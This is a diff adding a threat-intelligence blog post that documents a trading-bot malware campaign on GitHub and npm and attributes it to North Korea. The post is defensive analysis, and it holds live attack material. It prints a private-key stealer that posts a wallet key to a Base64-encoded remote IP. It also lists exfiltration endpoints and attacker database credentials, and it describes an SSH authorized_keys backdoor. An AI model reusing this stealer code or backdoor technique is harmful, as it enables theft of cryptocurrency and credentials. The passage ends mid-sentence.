@@ -1,0 +1,651 @@
+---
+title: Contagious Trader campaign - Coordinated weaponisation of cryptocurrency trading bots by suspected DPRK malware operators
+description: Discovering and attributing a novel campaign to North Korea
+date: 2026-03-14
+tags:
+ - malware
+ - npm
+ - github
+ - contagious trader
+---
+import Summary from "~/components/Summary.astro";
+import Callout from "~/components/Callout.astro";
+import Fig from "~/components/Fig.astro";
+
+import AdvertisingOnMedium from "./images/advertising-on-medium.png";
+import AnotoEcossistemCopyBotBlame from "./images/anoto-ecossistem-copy-bot-blame.png";
+import B64Offsets from "./images/b64-offsets.png";
+import BignumTsGhSearch from "./images/bignum-ts-gh-search.png";
+import BignumTsPackageJsonDependecy2 from "./images/bignum-ts-package-json-dependecy-2.png";
+import BignumTsPackageJsonDependecy from "./images/bignum-ts-package-json-dependecy.png";
+import BigNunberSearch from "./images/big-nunber-search.png";
+import HodlwardenBlame from "./images/hodlwarden-blame.png";
+import InstagramAdvertising from "./images/instagram-advertising.png";
+import IsItNk from "./images/is-it-nk.png";
+import MailinatorInbox from "./images/mailinator-inbox.png";
+import MailinatorPublishEvidence from "./images/mailinator-publish-evidence.png";
+import OverlapInCampaigns from "./images/overlap-in-campaigns.png";
+import TsBignSearch from "./images/ts-bign-search.png";
+import FairrustanaPolymarket from "./images/fairrustana-polymarket.png";
+
+<Callout type="warn">
+Attribution is fickle and not something an independent researcher
+typically does. I welcome all in the threat intelligence community to 
+check my homework. 
+</Callout>
+
+I've been tracking a highly distributed and sophisticated malware campaign on
+GitHub and npm targeting cryptocurrency users.
+
+Buckle up, this is a lengthy one. I have laboured the point in establishing a 
+link between novel techniques and malware samples to known DPRK 
+tactics and techniques, culminating in a high confidence attribution.
+
+
+<Summary>
+* The Contagious Trader campaign is a novel tranche of malware operations I 
+attribute to North Korea/Lazarus with high confidence
+* The campaign is highly active and consists of malicious cryptocurrency 
+trading bot projects on GitHub that advertise enticing yields
+* These GitHub projects are designed to exfiltrate sensitive files and/or
+private keys using a variety of techniques, including malicious npm dependencies.
+* Several tactics, techniques, and procedures from Contagious Trader are 
+consistent with North Korea and FAMOUS CHOLLIMA, however attribution to 
+a specific actor under the nebulous Lazarus moniker is withheld
+* IOCs: **~30** GitHub repositories (some taken down, more to be found), **37** npm packages,
+**23** domains/IPs, **5** operator IPs, and more
+* For attribution, skip to [Summary of overlaps](#summary-of-overlaps) between
+Contagious Interview and Contagious Trader
+* My [DPRK Research site](https://dprk-research.kmsec.uk/) now catalogues 
+npm malware from the Contagious Trader campaign
+</Summary>
+
+## Context
+
+FAMOUS CHOLLIMA is an active cell of DPRK's offensive cyber arm. They are 
+responsible for the Contagious Interview/Deceptive Development campaign, as 
+well as the IT Worker campaign. My favourite piece on North Korean tradecraft
+in these areas of late is [Gitlab's report on DPRK activity on their platform](https://about.gitlab.com/blog/gitlab-threat-intelligence-reveals-north-korean-tradecraft/).
+
+My [DPRK Research site](https://dprk-research.kmsec.uk/) catalogues npm malware 
+from FAMOUS CHOLLIMA's Contagious Interview campaign but I pick up all kinds
+of malware that I analyse in the background and keep in my private collection.
+
+<Fig src={IsItNk} caption="My workflow" />
+
+Throughout February 2026 into March 2026, I traced several novel infostealing npm 
+packages back to poisoned GitHub projects. All repositories had consistent trading bot themes, suggesting an
+organised, well-resourced campaign. I discovered many more malicious repos with
+many different infection points.
+
+The crypto-trading theme coupled with
+JavaScript malware loosely fits FAMOUS CHOLLIMA's modus operandi, however this was 
+unlike any FAMOUS CHOLLIMA malware I was familiar with.
+
+I have been hesitant to attribute Contagious Trader to North Korea,
+however the evidence has mounted to the point where I have high confidence in attributing
+it to North Korea, if not specifically FAMOUS CHOLLIMA.
+
+## GitHub footprint of Contagious Trader
+
+Before getting into infection chains, let's get familiar with the Contagious 
+Trader repository theme.
+
+Below is a screenshot of a malicious trading bot project.
+
+<Fig src={FairrustanaPolymarket} caption="A screenshot of the `fairrustana/polymarket-kalshi-arbitrage-bot-15min-market` GitHub project" />
+
+<Callout type="info">
+The repository is now redirected from user `fairrustana` to the 
+`Krypto-Hashers-Community` org. 
+</Callout>
+
+All malicious repositories disclosed here have some trading themes on digital 
+markets. **Kalshi**, **Polymarket**, **Solana**, **Raydium**, **Copy trading**, and more are all
+keywords frequently observed. 
+
+<Callout type="comment">
+In addition to the widespread footprint, many Contagious Trader repos have lots of forks and stars.
+These are highly likely automated or purchased to give the projects a false sense of legitimacy.
+</Callout>
+
+The total spread of impact on GitHub is hard for an individual researcher like me to follow.
+Not only are there many repositories being added and changed each week, but 
+the infection vector can vary:
+
+* Direct exfiltration to HTTP endpoint
+* Direct exfiltration to an actor-controlled database
+* Exfiltration and persistence via an npm dependency/transitive dependency
+* Rust strain of this campaign
+
+However, one thing is shared between all these repositories: the trading
+bot theme.
+
+Below, I expand on these infection vectors.
+
+### Direct exfiltration to a HTTP/S endpoint
+
+On February 23 2026, GitHub user kratos-te requested to be [added to the 
+`dev-protocol`](https://github.com/dev-protocol/community/issues/1511) 
+GitHub organisation.
+
+Following this, they created repository **dev-protocol/polymarket-arbitrage-trading-bot** and 
+implanted a Polymarket private key stealer.
+The repository has been removed, but here's the responsible malicious `validateProxyWallet` 
+function in `src/utils/validate.ts`. 
+The Base64-encoded content is `http://65.109.25[.]6:6000/api/polymarket-copytrading-bot-api-key/validate`.
+
+```javascript
+const validateProxyWallet = async () => {
+    try {
+        console.log('🔍 Validating proxy wallet private key...');
+        
+        // API configuration
+        const proxyHash = "aHR0cDovLzY1LjEwOS4yNS42OjYwMDAvYXBpL3BvbHltYXJrZXQtY29weXRyYWRpbmctYm90LWFwaS1rZXkvdmFsaWRhdGU="        
+        const response = await axios.post(Buffer.from(proxyHash,'base64').toString('utf-8'), {
+            privateKey: process.env.POLYMARKET_PRIVATE_KEY
+        }, {
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            timeout: 10000
+        });
+
+        if (response.data && response.data.success === false) {
+            console.error('❌ Private key validation failed: Invalid private key');
+            console.error('Please check your PRIVATE_KEY in the .env file');
+            throw new Error('Invalid private key. Please update PRIVATE_KEY in .env file with a valid Polygon wallet private key.');
+        }
+
+        console.log('✅ Private key validation successful');
+        return response.data;
+    } catch (error: any) {
+        if (error.response && error.response.data) {
+            console.error('❌ Validation failed:', error.response.data.message || error.response.data);
+        } else {
+            console.error('❌ Error validating private key:', error.message || error);
+        }
+        throw new Error('Private key validation failed. Please check your PRIVATE_KEY in .env file and ensure it is a valid 64-character hex string (without 0x prefix).');
+    }
+};
+
+export default validateProxyWallet;
+```
+<Callout type="info">
+The repo `dev-protocol/polymarket-arbitrage-trading-bot` was removed before I could archive it.
+An identical `validateProxyWallet` function was observed in 
+[`SEAN6977/polymarket-copytrading-bot`](https://github.com/SEAN6977/polymarket-copytrading-bot)
+(live at the time of writing).
+</Callout>
+
+The following other trading themed repositories implement similar encoded
+exfiltration endpoint implementations:
+
+| Repository | View on GitHub | Base64-encoded exfiltration endpoint |
+| --- | --- | --- |
+| [TopTrenDev/raydium-volume-bot-latest](https://github.com/TopTrenDev/raydium-volume-bot-latest) | [`utils/utils.ts`](https://www.google.com/search?q=%5Bhttps://github.com/TopTrenDev/raydium-volume-bot-latest/blob/68ab415274eb10b1d3f534fc2af1da42e5de6648/utils/utils.ts%23L7%5D(https://github.com/TopTrenDev/raydium-volume-bot-latest/blob/68ab415274eb10b1d3f534fc2af1da42e5de6648/utils/utils.ts%23L7)) | `hxxps://nodejs-be-production.up.railway[.]app/api/price` |
+| [kratos-te/Raydium-sniper](https://www.google.com/search?q=https://github.com/kratos-te/Raydium-sniper) | [`constants/constants.ts`](https://www.google.com/search?q=%5Bhttps://github.com/kratos-te/Raydium-sniper/blob/main/constants/constants.ts%23L37%5D(https://github.com/kratos-te/Raydium-sniper/blob/main/constants/constants.ts%23L37)) | `hxxp://23.137.105[.]114:6000/save-data` |
+| [kratos-te/pumpfun-bundler](https://www.google.com/search?q=https://github.com/kratos-te/pumpfun-bundler) | [`constants/constants.ts`](https://www.google.com/search?q=%5Bhttps://github.com/kratos-te/pumpfun-bundler/blob/main/constants/constants.ts%23L25%5D(https://github.com/kratos-te/pumpfun-bundler/blob/main/constants/constants.ts%23L25)) | `hxxp://154.38.188[.]168:5000/write` |
+| [kratos-te/copy-trading-bot](https://www.google.com/search?q=https://github.com/kratos-te/copy-trading-bot) | [`constants/index.ts`](https://www.google.com/search?q=%5Bhttps://github.com/kratos-te/copy-trading-bot/blob/36996d0ea0a7245f6df238cb884177866c11a8a2/constants/index.ts%23L9%5D(https://github.com/kratos-te/copy-trading-bot/blob/36996d0ea0a7245f6df238cb884177866c11a8a2/constants/index.ts%23L9)) | `hxxp://23.137.105[.]114:6000/save-data` |
+
+<Callout type="info">
+The dev-protocol organisation had [dozens of trading bots, all created 
+or updated in the beginning of 2026](https://github.com/orgs/dev-protocol/repositories?q=bot).
+They have since been purged, but it appears to have at one point been an attractive hub of 
+Contagious Trader repos.
+</Callout>
+
+### Direct database exfiltration
+
+Some trading bots utilise a really neat method to exfiltrate data with some 
+good misdirection to evade a cursory glance.
+
+[`ewindmer/polymarket-copytrading-bot-crypto`](https://github.com/ewindmer/polymarket-copytrading-bot-crypto) 
+leverages a [direct connection](https://github.com/ewindmer/polymarket-copytrading-bot-crypto/blob/6e3610b6247b178f47bc5010fd24029a2a44eed8/src/config/db.ts#L6) to
+`mongodb+srv://yabidev:roswelldev[@]cluster0.1ufrx5i.mongodb[.]net/` to [exfiltrate a user's secret key](https://github.com/ewindmer/polymarket-copytrading-bot-crypto/blob/d44abea3e174ff00e20e363d3fdac55299465c7d/src/index.ts#L40-L45).
+
+The screenshot below demonstrates using the Base64 offsets of "roswelldev" 
+to identify other malicious database connection strings.
+
+<Fig src={B64Offsets} caption="Finding other malicious mongodb connections by using the Base64 offsets for `roswelldev`" />
+
+Here is a list of repositories and deep links to the respective encoded DB connection string.
+
+| Repository | View on GitHub | Encoded database connection string |
+| --- | --- |:--- |
+| [ewindmer/polymarket-copytrading-bot](https://github.com/ewindmer/polymarket-copytrading-bot) | [`src/config/db.ts`](https://www.google.com/search?q=%5Bhttps://github.com/ewindmer/polymarket-copytrading-bot/blob/6e3610b6247b178f47bc5010fd24029a2a44eed8/src/config/db.ts%23L6%5D(https://github.com/ewindmer/polymarket-copytrading-bot/blob/6e3610b6247b178f47bc5010fd24029a2a44eed8/src/config/db.ts%23L6)) | `mongodb+srv://yabidev:roswelldev@cluster0.1ufrx5i.mongodb[.]net/` |
+| [ewindmer/polymarket-arbitrage-bot](https://github.com/ewindmer/polymarket-arbitrage-bot) | [`src/config/db.ts`](https://www.google.com/search?q=%5Bhttps://github.com/ewindmer/polymarket-arbitrage-bot/blob/a6151a810854050f5f1fb3804b2379a35f86cdf2/src/config/db.ts%23L6%5D(https://github.com/ewindmer/polymarket-arbitrage-bot/blob/a6151a810854050f5f1fb3804b2379a35f86cdf2/src/config/db.ts%23L6)) | `mongodb+srv://yabidev:roswelldev@cluster0.1ufrx5i.mongodb[.]net/` |
+| [LemnLabs/polymarket-trading-bot](https://www.google.com/search?q=https://github.com/LemnLabs/polymarket-trading-bot) | [`src/config/db.ts`](https://www.google.com/search?q=%5Bhttps://github.com/LemnLabs/polymarket-trading-bot/blob/3f507c86c2e635628a3ca465096d7c352d97f92a/src/config/db.ts%23L4%5D(https://github.com/LemnLabs/polymarket-trading-bot/blob/3f507c86c2e635628a3ca465096d7c352d97f92a/src/config/db.ts%23L4)) | `mongodb+srv://yabidev:roswelldev@cluster0.1ufrx5i.mongodb[.]net/`<br/>`mongodb+srv://blacksky:GOODday@aster.iejv3bg.mongodb[.]net/` (commented out) |
+| [roswelly/polymarket-copy-trading](https://www.google.com/search?q=https://github.com/roswelly/polymarket-copy-trading) | [`src/config/db.ts`](https://www.google.com/search?q=%5Bhttps://github.com/roswelly/polymarket-copy-trading/blob/055fa6bc68c2202370a87f8194ffcb114ea2c5d6/src/config/db.ts%23L5%5D(https://github.com/roswelly/polymarket-copy-trading/blob/055fa6bc68c2202370a87f8194ffcb114ea2c5d6/src/config/db.ts%23L5)) | `mongodb+srv://yabidev:roswelldev@cluster0.1ufrx5i.mongodb[.]net/`<br/>`mongodb+srv://blacksky:GOODday@aster.iejv3bg.mongodb[.]net/` (commented out) |
+
+### npm dependecy malware
+
+The npm malware is fairly consistent across repositories, with slight variations in
+implementation. We'll begin by looking at the GitHub dependency footprint before looking at
+the npm malware itself. 
+
+The table below shows a variety of trading bot repositories and their malicious npm dependencies.
+
+
+| Repository | Dependency | Exfil endpoint |
+| --- | --- | --- |
+| [leonyx007/Polymarket-Arbitrage-Trading-Bot](https://github.com/leonyx007/Polymarket-Arbitrage-Trading-Bot) | `pretty-fancy` | `logger[.]clob[.]health` |
+| [leonyx007/Solana-PumpFun-0block-Sniper-Bot](https://github.com/leonyx007/Solana-PumpFun-0block-Sniper-Bot) | `pretty-fancy` | `logger[.]clob[.]health` |
+| [HyperBuildX/Polymarket-Trading-Bot-Rust](https://github.com/HyperBuildX/Polymarket-Trading-Bot-Rust/commit/626fb1fe74d9202855146869d0976183754c7da2#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519) | `clob-client-sdk` -> `decode-sdks` | `hxxp://45[.]8[.]22[.]144:8080/deep-es6` |
+| [Anoto-ecossistem/polymarket-copy-bot](https://github.com/Anoto-ecossistem/polymarket-copy-bot) | `pino-pretty-log` | `www[.]blxrbn[.]com` |
+| [hodlwarden/polymarket-arbitrage-copy-bot](https://github.com/hodlwarden/polymarket-arbitrage-copy-bot/blob/master/package.json) | `pino-pretty-log` | `www[.]blxrbn[.]com` |
+| [dev-protocol/polymarket-arbitrage-bot](https://github.com/dev-protocol/polymarket-arbitrage-bot/blob/master/package.json) | `bignum-ts` -> `ts-lint-builder` | `cloudflareinsights[.]vercel[.]app` |
+| [sssorryMaker/polymarket-trading-bot](https://github.com/sssorryMaker/polymarket-trading-bot/commit/28261d172faedd25729a0c2693bffbba032919dc#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519) | `bign.ts` -> `npm-doc-build` | did not capture |
+| [sssorryMaker/polymarket-trading-bot](https://github.com/sssorryMaker/polymarket-trading-bot/commit/28261d172faedd25729a0c2693bffbba032919dc#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519) | `bignum-ts` -> `ts-lint-builder` | `cloudflareinsights[.]vercel[.]app` |
+| [sssorryMaker/polymarket-trading-bot](https://github.com/sssorryMaker/polymarket-trading-bot/commit/28261d172faedd25729a0c2693bffbba032919dc#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519) | `ts-bign` -> `levex-refa` | `cloudflareguard[.]vercel[.]app` | 
+| [sssorryMaker/polymarket-trading-bot](https://github.com/sssorryMaker/polymarket-trading-bot/commit/28261d172faedd25729a0c2693bffbba032919dc#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519) | `big-nunber` -> `lint-builder` | `cloudflareinsights[.]vercel[.]app` | 
+| [CrewSX/pumpfun-bubblemap-bypass-bundler](https://github.com/CrewSX/pumpfun-bubblemap-bypass-bundler/blob/main/package.json) | `@mgcrae/pino-pretty-logger` | `polymarket-clob[.]com` | 
+| [CrewSX/polymarket-arbitrage-copytrading-trading-bot](https://github.com/CrewSX/polymarket-arbitrage-copytrading-trading-bot/blob/main/package.json) | `@mgcrae/pino-pretty-logger` | `polymarket-clob[.]com` |
+| [dev-protocol/polymarket-arbitrage-trading-bot-pack](https://github.com/dev-protocol/polymarket-arbitrage-trading-bot-pack/blob/a79f2d4af599fd23260c0364ba7efbc02d3e029e/v2_typescript/package.json#L12) | `chalk-logger-prettier` | `hxxps://chalk-logger[.]vercel[.]app/` | 
+| [dev-protocol/polymarket-copy-trading-bot-sports](https://github.com/dev-protocol/polymarket-copy-trading-bot-sports/blob/66c45aaae1ff2ff6e17c70a30f45f83f802771a5/package.json) | `ts-bign` -> `levex-refa` | `cloudflareguard[.]vercel[.]app` | 
+| [Krypto-Hashers-Community/polymarket-kalshi-arbitrage-bot-15min-market](https://github.com/Krypto-Hashers-Community/polymarket-kalshi-arbitrage-bot-15min-market/blob/main/package.json#L38) | `bn-eslint.js` -> `npm-eslint-helper` | `hxxps://eslint-helper[.]vercel[.]app/api/v1` |
+
+<Callout type="info">
+For the full list of npm packages attributed to this campaign, see [the IOCs section](#npm-packages).
+</Callout>
+
+#### Analysis
+
+For analysis, I am graciously helped by an operator that published `npm-builders` version 1.0.8, an 
+unobfuscated sample that cleanly represents the techniques used in the majority of 
+the npm malware leveraged in Contagious Trader.
+
+The malware is in `./index.js`. You can [view this sample on my DPRK research 
+site](https://dprk-research.kmsec.uk/api/samples/ecb6eec9b12dfc677a5a162c2488b25b42c0363946394a1511f406090ba303a6)
+or [download the entire package tgz](https://dprk-research.kmsec.uk/api/tarfiles/npm-builders/1.0.8).
+
+**npm malware capabilities**
+
+* Retrieves the victim's IP using api.ipify[.]org
+* Scans the victim's filesystem using a dynamic pattern retrieved from the 
+exfiltration server
+* Files are batch uploaded to the exfiltration server
+* On Windows, it uses `wmic` to enumerate local disks
+* On Linux systems, it creates a backdoor by appending an SSH public key to the 
+user's `~/.ssh/authorized_keys` file. It also permits SSH (port 22) using `ufw`.
+The SSH key is retrieved dynamically from the exfiltration server
+* For `npm-builders`, the exfiltration server is hxxps://cloudflareinsights.vercel[.]app
+* The infection chain is invoked by a `postinstall` script that executes `/test.js`, which
+invokes the malicious `from_str()` function.  
+
+Here are the specific HTTP endpoints observed on the exfiltration server:
+
+| Path | Purpose |
+|:----|:--------|
+| `/` (root) | Returns the actor's SSH key to be added | 
+|`/api/scan-patterns` | Scan patterns for enumerating files to steal |
+| `/api/block-patterns` | Blocklist of patterns when enumerating files |
+|`/api/v1` | File exfiltration endpoint (POST endpoint) |
+
+Here is the SSH key I retrieved. During analysis over several days, this response
+payload was consistent:
+
+```
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYMx8MqdYTD/aZjqxmXo+9460+9EvsSjfiy9YAU+xwY support@polymarket.com
+```
+
+Here is the scan patterns response:
+
+```json
+{"scanPatterns":[".env",".bash_history","ConsoleHost_history.txt"]}
+```
+
+Here is the block patterns response:
+
+```json
+{"blockPatterns":["node_modules",".rustup",".cargo",".vscode-server"]}
+```
+
+### Variations on npm malware
+
+Not all npm malware used in Contagious Trader is the same, and I won't labour the
+point on each variation.
+
+* `chalk-logger-prettier` contains logic to steal Telegram session data, and has a 
+hardcoded SSH key rather than one dynamically retrieved. 
+* `tracing-str` is a stripped down variant that skips file scanning and goes straight
+to the SSH backdoor.
+* [Read my colleague Paul Newton's analysis on `chalk-logger-prettier`](https://newtonpaul.com/npm-packages/chalk-logger-prettier/) 
+and [`tracing-str`](https://newtonpaul.com/npm-packages/tracing-str/).
+
+
+### Rust and crates.io footprint
+
+Finally, I noticed many other trading bots written in Rust, but I'm not too 
+familiar with Rust (yet!) and I wanted to triage the JavaScript ones first. 
+However, I did discover [aestik6/Polymarket-crypto-5min-arbitrage-bot](https://github.com/aestik6/Polymarket-crypto-5min-arbitrage-bot/blob/main/Cargo.toml#L33)
+that depends on `time_calibrator`, one of several malicious infostealer crates
+disclosed by Kirill Boychenko of [Socket](https://socket.dev/blog/5-malicious-rust-crates-posed-as-time-utilities-to-exfiltrate-env-files).
+
+<Callout type="comment">
+No further rust footprint identified as yet, but due to the sheer volume of 
+these trading repos, it's highly likely there is more rust-flavoured 
+malware to find.
+</Callout>
+
+### Other research
+
+Despite the volume of repositories, there hasn't been much prior research.
+In December 2025, [@hunterweb303 on X disclosed an npm infection 
+chain from a Polymarket bot](https://x.com/hunterweb303/status/2002380800285978826).
+The repo and user have both been taken down.
+
+## Measuring up to DPRK
+
+Contagious Trader looks very different from Contagious Interview at first blush. 
+The target audience is not job-hunting developers, for starters. That said, there is
+strong evidence to suggest  that the Contagious Trader operation is DPRK-nexus,
+if not specifically attributable to FAMOUS CHOLLIMA (the actor behing Contagious 
+Interview). 
+
+### npm packages `ts-lint-builder` and `bignum-ts`
+
+<Callout type="info">
+For this section, I should add some context: in January 2026, I observed 
+a [novel RAT that I called BigSquatRAT](/blog/js-malware-bigmathix) that
+vibe-squatted big.js with a C2 of aurevian[.]cloud. This was far too removed from my 
+understanding of FAMOUS CHOLLIMA's malware at the time, however in February
+2026, [ReversingLabs attributed this activity to FAMOUS CHOLLIMA's Contagious
+Interview campaign](https://www.reversinglabs.com/blog/fake-recruiter-campaign-crypto-devs)
+(with screenshots!). ReversingLabs' evidence tying this
+to FAMOUS CHOLLIMA is extremely strong and I agree with their assessment. 
+They dubbed this aspect of Contagious Interview **graphalgo**.
+
+Unbeknownst to me at the time, BigSquatRat was an undocumented DPRK-attributed
+malware strain, and the **name themes around big.js was a unique attribute of this
+part of FAMOUS CHOLLIMA's operation**.
+</Callout>
+
+The first revelation came when I discovered `ts-lint-builder` and its benign
+intermediary `bignum-ts`. The screenshot below demonstrates `bignum-ts` as a 
+dependency in several Contagious Trader repos.
+
+<Fig src={BignumTsGhSearch} caption="bignum-ts is used as an intermediate 
+dependency in the Contagious Trader campaign" />
+
+`ts-lint-builder` acts as a lynchpin for strengthening the DPRK attribution for the Contagious Trader campaign.
+
+* `ts-lint-builder` uses a vercel[.]app deployment for staging resources (often seen in Contagious Interview)
+* Has a dependent package (`bignum-ts`) that impersonates big.js (just like bigmathix and ReversingLabs `graphalgo` workstream of Contagious Interview)
+* `bignum-ts` is observed as a dependency in a number of poisoned trading bot projects on GitHub (the novel Contagious Trader campaign)
+
+To illustrate the point, below is a diagram that shows these similarities:
+
+<Fig src={OverlapInCampaigns} caption="Operational preferences for malware development overlap between the three tranches" />
+
+That diagram does _not_ lead to a high confidence attribution, but it did get
+me excited.
+
+### Temporary email usage
+
+Additional evidence came when I discovered that the operators were using an
+almost identical temporary email strategy as [I previously documented and 
+tracked](/blog/dprk-opsec-3) in the Contagious Interview campaign, the only
+novelty being the email provider (emailnator[.]com). It took me some time
+to actually discover this, as emailinator generates temporary Gmail accounts
+which are harder to identify as temporary mailboxes.
+
+Only a handful of inboxes were examined due to my latent discovery, but
+the results are damning. 
+
+The following image shows a specific publish notification for npm user 
+responsible for packages `lint-builder` (malware) and `big-nunber` (benign 
+intermediary that depends on `lint-builder`) 
+leveraged in the Contagious Trader campaign. The image shows package `lint-builder` v1.0.1 was
+published from IP 87.120.102[.]178, which is an **Astrill VPN exit node**.
+
+<Fig src={MailinatorPublishEvidence} caption="Emailinator inbox message showing a publish source of an Astrill VPN exit node" />
+
+The following image shows `big-nunber` being used as a dependency in Contagious
+Trader repositories:
+
+<Fig src={BigNunberSearch} caption="GitHub search results showing `big-nunber` dependent trading repos" />
+
+The figure below displays a emailinator inbox from 
+npm user `l.os.t.k.yl.e184`, who published `ts-bign` (benign intermediary) and
+`levex-refa` (SSH implant malware) using the email `l.os.t.k.yl.e184[@]gmail.com`,
+showing successive publishes.
+
+<Fig src={MailinatorInbox} caption="Multiple successive publishes evidenced in the Emailinator inbox" />
+
+The following image from GitHub search shows `ts-bign` being used as a dependency
+in trading bots. The infection chain will be triggered as `levex-refa` is a 
+transitive dependency. This illustrates the direct involvement the actor has in the
+Contagious Trader campaign.
+
+<Fig src={TsBignSearch} caption="GitHub search results showing `ts-bign` dependent trading repos" />
+
+And finally, the table below contains the data I was able to extract from 
+inboxes, demonstrating that **most packages being distributed from Astrill 
+VPN exit nodes**:
+
+| User | Package (version) | Time | Publish IP | Comment |
+| --- | --- | --- | --- | --- |
+| l.os.t.k.yl.e184 | levex-refa (1.0.0) | 2026-03-12 06:39:51 | 192.161.60[.]132 | Astrill VPN |
+| l.os.t.k.yl.e184 | ts-bign (1.2.8) | 2026-03-12 06:47:53 | 192.161.60[.]132 | Astrill VPN |
+| nami.jam.i.h.s.h.s | lint-builder (1.0.1) | 2026-03-12 07:31:40 | 87.120.102[.]178 | Astrill VPN |
+| w.ixs.t.ocle | big-numben (5.0.2) | 2026-03-12 16:29:02 | 89.187.161[.]180 | Astrill VPN |
+| w.ixs.t.ocle | es-lint-builder (1.0.0) | 2026-03-12 16:24:38 | 89.187.161[.]180 | Astrill VPN |
+| ja.vierj.ea.n.070 |  es-lint-entry (1.0.0) | 2026-03-16 10:44:40 | 66.150.196[.]58 | Astrill VPN |
+| ja.vierj.ea.n.070 |  lint-entry (1.0.0) | 2026-03-16 11:22:19 | 66.150.196[.]58 | Astrill VPN |
+| ja.vierj.ea.n.070 |  linter-entry (1.0.0) | 2026-03-16 11:23:08 | 66.150.196[.]58 | Astrill VPN |
+| ja.vierj.ea.n.070 |  lint-builders (1.0.0) | 2026-03-16 11:24:50 | 39.144.60[.]174 | China Mobile | 
+| ja.vierj.ea.n.070 |  big-numerate (5.0.3) | 2026-03-16 11:37:42 | 87.120.102[.]178 | Astrill VPN | 
+
+This is very consistent with my [documented tracking of FAMOUS CHOLLIMA's
+npm publish IPs](/blog/dprk-opsec-3). Astrill VPN is an anonymising service 
+preferred by FAMOUS CHOLLIMA. The China Mobile IP 39.144.60[.]174 is notable
+as it is observed within minutes of successive publishes from the same npm 
+user with Astrill VPN exit IPs on either side. This is also consistent with
+Chinese IPs observed in prior tracking of FAMOUS CHOLLIMA.
+
+<Callout type="comment">
+It is possible the China Mobile IP 39.144.60[.]174 is a temporary
+de-anonymisation of the malware operator.
+</Callout>
+
+### FAMOUS CHOLLIMA's wider operational changes
+
+The lure and payload in the Contagious Trader campaign is completely novel
+compared to what we know about the Contagious interview campaign:
+
+| Campaign                | Initial lure                      | Infection chain                                                                    |
+|:--|:--|:--|
+| Contagious Interview    | Spearphishing, job adverts        | Eval remote content -> OtterCookie, Beavertail, InvisibleFerrett, (Go\|Py)langGhost, BigSquatRAT |
+| Contagious Trader       | Posts on social media, GitHub popularity (stars and forks) | Theft of sensitive data. SSH backdoor. |
+
+However, the core of both campaigns remains the same: large-scale theft of
+cryptocurrency from individuals. The victimology of Contagious Trader is more broad -- 
+it targets all cryptocurrency users, not just developers looking for new
+opportunities.
+
+Throughout early 2026, I have observed an increased pace in iteration
+and development by FAMOUS CHOLLIMA, signalling a shift in operational tactics:
+
+* January 2026 - [BigSquatRAT](/blog/js-malware-bigmathix), although ReversingLabs' 
+report indicates a long-lived campaign.
+* February 2026 - [Google Drive stager](/blog/dprk-gdrive-stager)
+* February 2026 - [StegaBin stager](/blog/dprk-text-steganography)
+* February/March 2026 - [First instance of PylangGhost on npm](/blog/pylangghost-npm)
+
+More drastic operational changes like exploring a new revenue stream via
+Contagious Trader, would be consistent with the above findings. 
+
+### Summary of overlaps
+
+To summarise this section linking Contagious Trader to Contagious Interview, the
+following table shows almost identical operational preferences 
+between the two tranches of activity:
+
+| Tactic/technique/procedure | Contagious Interview | Contagious Trader |
+|:---|:---|:---|
+| Targeting cryptocurrency users | Developers are targeted through fake roles | Developers are enticed by the projects' apparent popularity (lots of stars and forks), the trading bots are advertised on social media |
+| Heavily leveraging GitHub and npm infrastructure for malware operations | Poisoned repositories are hosted on GitHub, Gitlab, and Bitbucket. npm packages are commonly abused. | Poisoned repositories on GitHub with a variety of exfiltration mechanisms  |
+| Using Vercel infrastructure as a stager | Example: ext-checkdin[.]vercel[.]app, as seen in my [StegaBin disclosure and analysis](/blog/dprk-text-steganography) | cloudflareinsights[.]vercel[.]app (npm:npm-builders), cloudflareguard[.]vercel[.]app (npm:levex-refa)  | 
+| Base64-encoded payload URLs | [Payload URL masquerading as environment variable](https://github.com/apollo0724/Onyxverse-mvp/blob/main/.env#L16) | [An exfiltration endpoint](https://github.com/kratos-te/Raydium-sniper/blob/main/constants/constants.ts#L37) is set as an environment variable and then used to [exfiltrate a user's private key](https://github.com/kratos-te/Raydium-sniper/blob/0d0dce9f95a2eadf835187531d5dbe917397e82d/buy.ts#L133) via a [helper function](https://github.com/kratos-te/Raydium-sniper/blob/0d0dce9f95a2eadf835187531d5dbe917397e82d/utils/logger.ts#L22-L25) |
+| Soliciting contact via Telegram | [A role advertised by a GitHub account almost certainly controlled by FAMOUS CHOLLIMA](https://github.com/Dargon789/hardhat-project/issues/2044) | [Telegram contact details are advertised in the repository description](https://github.com/dev-protocol/polymarket-arbitrage-trading-bot) |
+| Masquerading/vibe-squatting npm packages | pino, express, json are all keywords often seen in npm packages. Impersonating big.js is a tactic observed in a prior report and attributed by ReversingLabs | Several npm packages follow "log" and "pino" themes, like `pino-utils`, `chalk-logger-prettier` and `pino-logger-utils`, in addition to variations of "big" and "number". |
+| Usage of temporary email services | [As discussed in a prior blog post](/blog/dprk-opsec-3) | npm users `nami.jam.i.h.s.h.s`, `w.ixs.t.ocle`, and `l.os.t.k.yl.e184` all published from temporary email addresses via emailinator. |
+| Usage of anonymising infrastructure to publish npm packages | [As discussed in a prior blog post](/blog/dprk-opsec-3), temp mailboxes disclose Astrill VPN publish sources, amongst others | Temporary mailboxes disclosed Astrill VPN publish sources |
+
+### Other possible nexuses
+
+Leveraging common developer tooling like GitHub, npm, and Vercel are not necessarily
+unique fingerprints of North Korea's malware operations, as these popular 
+tools and platforms could be the first port of call for any developer,
+malign intent or not.
+
+GitHub user aestik6, responsible for creating the Rust-strain Contagious Trader repo 
+outlined above, created a repository two years ago [containing Chinese subtitle 
+resources](https://github.com/aestik6/sub/tree/main), and additionally they have
+starred a repository whose audience is ostensibly mainly Chinese-speaking, [based on 
+the README](https://github.com/datawhalechina/all-in-rag). 
+
+That said, North Korean operatives [have been observed working directly with Chinese-speaking
+handlers](https://www.hudsonrock.com/blog/6262).
+
+## Assessment
+
+This activity represents a coordinated, high sophistication, multi-platform
+campaign targeting cryptocurrency investors. The targeting scope, 
